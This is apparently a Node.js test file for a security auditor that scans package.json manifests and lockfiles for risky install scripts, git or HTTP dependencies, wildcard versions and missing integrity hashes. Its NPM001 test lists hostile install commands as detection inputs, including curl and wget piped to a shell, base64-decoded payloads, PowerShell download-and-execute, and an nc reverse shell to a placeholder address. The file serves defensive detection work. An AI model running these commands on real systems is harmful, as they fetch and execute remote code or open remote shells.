'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { audit, classifySpec, sortFindings } = require('../src/audit.js');

const man = (obj, opts) => audit(JSON.stringify(obj), 'package.json', opts || {});
const rules = (f) => f.map((x) => x.rule).sort();
const lock = (obj) => audit(JSON.stringify(obj), 'package-lock.json', {});

test('classifySpec', () => {
  const c = classifySpec;
  assert.strictEqual(c('^1.2.3'), 'registry');
  assert.strictEqual(c('1.2.3'), 'registry');
  assert.strictEqual(c('~1.2'), 'registry');
  assert.strictEqual(c('>=1.0.0 <2'), 'registry');
  assert.strictEqual(c('npm:other@1.0.0'), 'registry');
  assert.strictEqual(c('workspace:*'), 'registry');
  for (const w of ['*', 'x', 'X', 'latest', 'LATEST', '', '  ', '>=0', '>= 0', '>=0.0.0']) assert.strictEqual(c(w), 'wildcard', w);
  for (const g of ['git+https://h/r.git', 'git://h/r', 'git@h:o/r.git', 'github:o/r', 'gitlab:o/r', 'bitbucket:o/r', 'gist:abc', 'https://h/a.tgz', 'ssh://h/r', 'o/r', 'o/r#v1', 'user.name/repo-x']) assert.strictEqual(c(g), 'git', g);
  assert.strictEqual(c('http://h/a.tgz'), 'http');
  assert.strictEqual(c('file:../x'), 'local');
  assert.strictEqual(c('link:../x'), 'local');
  assert.strictEqual(c(5), 'other');
  assert.strictEqual(c(null), 'other');
});

test('clean manifest has no findings', () => {
  assert.deepStrictEqual(man({ name: 'a', scripts: { test: 'node --test', build: 'tsc' }, dependencies: { a: '^1.0.0' } }), []);
});

test('NPM001 detects dangerous install scripts', () => {
  const bad = [
    'curl -s https://x.test/i | sh',
    'wget -qO- https://x.test/i | sudo bash',
    'node -e "console.log(1)"',
    'node --eval "1"',
    'eval $PAYLOAD',
    'echo aGk= | base64 -d | sh',
    'powershell -enc AAAA',
    'bash <(curl https://x.test/i)',
    'cat < /dev/tcp/1.2.3.4/80',
    'nc -e /bin/sh 1.2.3.4 99',
    'IEX (New-Object Net.WebClient).DownloadString("http://x")',
  ];
  for (const cmd of bad) {
    const f = man({ scripts: { postinstall: cmd } });
    assert.ok(rules(f).includes('NPM001'), cmd);
  }
});

test('NPM001 ignores harmless scripts', () => {
  for (const cmd of ['node scripts/setup.js', 'husky install', 'tsc -p .', 'node-gyp rebuild', 'curl -o file https://x.test/f']) {
    assert.ok(!rules(man({ scripts: { postinstall: cmd } })).includes('NPM001'), cmd);
  }
});

test('NPM002 severity by hook', () => {
  for (const h of ['preinstall', 'install', 'postinstall']) {
    const f = man({ scripts: { [h]: 'echo hi' } });
    assert.strictEqual(f[0].sev, 'medium');
    assert.strictEqual(f[0].rule, 'NPM002');
    assert.strictEqual(f[0].where, `package.json#scripts.${h}`);
  }
  assert.strictEqual(man({ scripts: { prepare: 'echo hi' } })[0].sev, 'low');
});

test('NPM002 ignores non-install scripts', () => {
  assert.deepStrictEqual(man({ scripts: { test: 'x', build: 'y', start: 'z', prepublishOnly: 'q' } }), []);
});

test('NPM007 sudo and unsafe-perm', () => {
  assert.ok(rules(man({ scripts: { install: 'sudo make install' } })).includes('NPM007'));
  assert.ok(rules(man({ scripts: { install: 'npm i --unsafe-perm' } })).includes('NPM007'));
  assert.ok(!rules(man({ scripts: { install: 'make install' } })).includes('NPM007'));
});

test('NPM003 git and url dependencies in every section', () => {
  for (const sec of ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies']) {
    const f = man({ [sec]: { a: 'github:o/r' } });
    assert.deepStrictEqual(rules(f), ['NPM003'], sec);
    assert.strictEqual(f[0].where, `package.json#${sec}.a`);
  }
  assert.strictEqual(man({ dependencies: { a: 'http://h/a.tgz' } })[0].rule, 'NPM003');
  assert.match(man({ dependencies: { a: 'http://h/a.tgz' } })[0].msg, /plain HTTP/);
});

test('NPM004 wildcard versions', () => {
  assert.deepStrictEqual(rules(man({ dependencies: { a: '*' } })), ['NPM004']);
  assert.deepStrictEqual(rules(man({ dependencies: { a: 'latest' } })), ['NPM004']);
  assert.deepStrictEqual(rules(man({ dependencies: { a: '' } })), ['NPM004']);
  assert.deepStrictEqual(man({ dependencies: { a: '^1.0.0' } }), []);
});

test('NPM005 local dependencies are low', () => {
  const f = man({ dependencies: { a: 'file:../a', b: 'link:../b' } });
  assert.deepStrictEqual(rules(f), ['NPM005', 'NPM005']);
  assert.ok(f.every((x) => x.sev === 'low'));
});

test('NPM008 lockfile check uses the directory', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'nia-'));
  const m = { dependencies: { a: '1.0.0' } };
  assert.deepStrictEqual(rules(man(m, { dir: d })), ['NPM008']);
  for (const lockName of ['package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'npm-shrinkwrap.json']) {
    fs.writeFileSync(path.join(d, lockName), '');
    assert.deepStrictEqual(man(m, { dir: d }), [], lockName);
    fs.unlinkSync(path.join(d, lockName));
  }
  assert.deepStrictEqual(man({ name: 'nodeps' }, { dir: d }), []);
  assert.deepStrictEqual(man(m), []);
  fs.rmSync(d, { recursive: true });
});

test('lockfile v3 entries', () => {
  const f = lock({
    lockfileVersion: 3,
    packages: {
      '': { name: 'x' },
      'node_modules/a': { resolved: 'http://r.test/a.tgz', integrity: 'sha512-x' },
      'node_modules/b': { resolved: 'https://registry.npmjs.org/b.tgz' },
      'node_modules/c': { resolved: 'https://registry.npmjs.org/c.tgz', integrity: 'sha512-y' },
      'node_modules/d': { link: true, resolved: 'packages/d' },
    },
  });
  assert.deepStrictEqual(rules(f), ['NPM006', 'NPM009']);
  assert.strictEqual(f.find((x) => x.rule === 'NPM006').where, 'package-lock.json#node_modules/a');
});

test('lockfile v1 nested dependencies', () => {
  const f = lock({
    lockfileVersion: 1,
    dependencies: {
      a: { resolved: 'https://r.test/a.tgz', integrity: 'x', dependencies: { b: { resolved: 'http://r.test/b.tgz', integrity: 'x' } } },
    },
  });
  assert.deepStrictEqual(rules(f), ['NPM006']);
  assert.match(f[0].where, /a>b/);
});

test('lockfile git resolutions need no integrity', () => {
  const f = lock({ packages: { 'node_modules/g': { resolved: 'git+ssh://git@h/r.git#abc' } } });
  assert.deepStrictEqual(f, []);
  const h = lock({ packages: { 'node_modules/g': { resolved: 'git+http://h/r.git#abc' } } });
  assert.deepStrictEqual(rules(h), ['NPM006']);
});

test('invalid and odd JSON', () => {
  assert.deepStrictEqual(rules(audit('{nope', 'package.json')), ['NPM000']);
  assert.strictEqual(audit('{nope', 'package.json')[0].sev, 'info');
  assert.deepStrictEqual(rules(audit('[]', 'package.json')), ['NPM000']);
  assert.deepStrictEqual(rules(audit('42', 'package.json')), ['NPM000']);
  assert.deepStrictEqual(rules(audit('null', 'package.json')), ['NPM000']);
  assert.deepStrictEqual(rules(audit('', 'package.json')), ['NPM000']);
});

test('wrong types inside a manifest', () => {
  assert.doesNotThrow(() => man({ scripts: 'x', dependencies: [1, 2], devDependencies: 5 }));
  assert.doesNotThrow(() => man({ scripts: { postinstall: 5 }, dependencies: { a: null, b: 7, c: {} } }));
  assert.doesNotThrow(() => lock({ packages: [], dependencies: 'x' }));
  assert.doesNotThrow(() => lock({ packages: { a: 5, b: null, c: { resolved: 5 } } }));
});

test('deeply nested lockfile does not overflow', () => {
  const n = 5000;
  const text = '{"dependencies":{"r":'
    + '{"resolved":"http://r.test/x.tgz","dependencies":{"n":'.repeat(n)
    + '{}' + '}}'.repeat(n) + '}}';
  let f;
  assert.doesNotThrow(() => { f = audit(text, 'package-lock.json', {}); });
  assert.ok(f.length >= 1);
});

test('sortFindings orders by severity, file, rule', () => {
  const s = sortFindings([
    { sev: 'low', rule: 'B', file: 'a', where: 'a' },
    { sev: 'high', rule: 'Z', file: 'b', where: 'b' },
    { sev: 'high', rule: 'A', file: 'b', where: 'b' },
    { sev: 'high', rule: 'A', file: 'a', where: 'a' },
  ]);
  assert.deepStrictEqual(s.map((x) => `${x.sev}${x.file}${x.rule}`), ['highaA', 'highbA', 'highbZ', 'lowaB']);
});

test('3000 random manifests never throw', () => {
  let seed = 11;
  const rnd = (n) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
  const vals = ['*', 'latest', '^1.0.0', 'github:o/r', 'http://h/a', 'file:x', '', 5, null, true, [], {}, 'curl x | sh', 'sudo x'];
  const keys = ['scripts', 'dependencies', 'devDependencies', 'postinstall', 'preinstall', 'a', 'packages', 'resolved'];
  for (let i = 0; i < 3000; i++) {
    const o = {};
    for (let j = 0; j < rnd(6); j++) {
      const k = keys[rnd(keys.length)];
      o[k] = rnd(2) ? vals[rnd(vals.length)] : { [keys[rnd(keys.length)]]: vals[rnd(vals.length)] };
    }
    assert.doesNotThrow(() => audit(JSON.stringify(o), 'package.json', {}));
    assert.doesNotThrow(() => audit(JSON.stringify(o), 'package-lock.json', {}));
  }
});
